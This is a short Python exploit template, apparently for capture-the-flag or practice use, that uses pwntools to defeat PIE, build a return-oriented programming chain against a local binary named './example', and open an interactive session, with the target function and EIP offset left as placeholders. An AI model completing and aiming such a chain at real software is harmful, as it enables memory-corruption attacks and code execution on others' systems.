#!/usr/bin/env python3

from pwn import *

elf = ELF("./example")
# set the base address, to combat PIE
elf.address = elf.libs['/app/example']

# create a ropchain
rop = ROP(elf)

########################################

# This needs to be the function you want to call
# <https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP>
rop.funcname()

# This needs to be the offset for eip.
# Consider using create_table.py to find eip
offset = ...

########################################

payload = flat({
    offset: rop.chain()
})

print("ropchain:")
print(rop.dump())

with elf.process([payload]) as p:
    p.interactive()

